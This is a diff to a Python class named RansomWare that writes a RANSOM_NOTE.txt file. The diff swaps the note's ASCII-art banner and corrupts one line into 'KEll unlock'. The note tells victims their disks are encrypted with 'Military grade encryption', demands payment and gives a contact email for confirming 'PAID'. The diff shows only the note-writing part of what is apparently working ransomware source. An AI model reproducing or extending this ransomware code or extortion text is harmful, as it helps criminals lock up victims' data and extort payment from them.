@@ -149,19 +149,13 @@ class RansomWare:
         date = datetime.date.today().strftime('%d-%B-Y')
         with open('RANSOM_NOTE.txt', 'w') as f:
             f.write(f'''
-███╗░░██╗░█████╗░  ░██╗░░░░░░░██╗░█████╗░██╗░░░██╗
-████╗░██║██╔══██╗  ░██║░░██╗░░██║██╔══██╗╚██╗░██╔╝
-██╔██╗██║██║░░██║  ░╚██╗████╗██╔╝███████║░╚████╔╝░
-██║╚████║██║░░██║  ░░████╔═████║░██╔══██║░░╚██╔╝░░
-██║░╚███║╚█████╔╝  ░░╚██╔╝░╚██╔╝░██║░░██║░░░██║░░░
-╚═╝░░╚══╝░╚════╝░  ░░░╚═╝░░░╚═╝░░╚═╝░░╚═╝░░░╚═╝░░░
+░█████╗░░█████╗░░█████╗░██████╗░░██████╗██╗
+██╔══██╗██╔══██╗██╔══██╗██╔══██╗██╔════╝██║
+██║░░██║██║░░██║██║░░██║██████╔╝╚█████╗░██║
+██║░░██║██║░░██║██║░░██║██╔═══╝░░╚═══██╗╚═╝
+╚█████╔╝╚█████╔╝╚█████╔╝██║░░░░░██████╔╝██╗
+░╚════╝░░╚════╝░░╚════╝░╚═╝░░░░░╚═════╝░╚═╝
 
-░█████╗░██╗░░░██╗████████╗██╗
-██╔══██╗██║░░░██║╚══██╔══╝██║
-██║░░██║██║░░░██║░░░██║░░░██║
-██║░░██║██║░░░██║░░░██║░░░╚═╝
-╚█████╔╝╚██████╔╝░░░██║░░░██╗
-░╚════╝░░╚═════╝░░░░╚═╝░░░╚═╝
 
 The harddisks of your computer have been encrypted with an Military grade encryption algorithm.
 There is no way to restore your data without a special key.
@@ -175,7 +169,7 @@ To purchase your key and restore your data, please follow these three easy steps
    Once payment has been completed, send another email to kowqer@proton.me stating "PAID".
    We will check to see if payment has been paid.
 
-3. You will receive a text file with your KEY that will unlock all your files. 
+3. You will receive a text file with your KEll unlock all your files. 
    IMPORTANT: To decrypt your files, place text file on desktop and wait. Shortly after it will begin to decrypt all files.
 
 
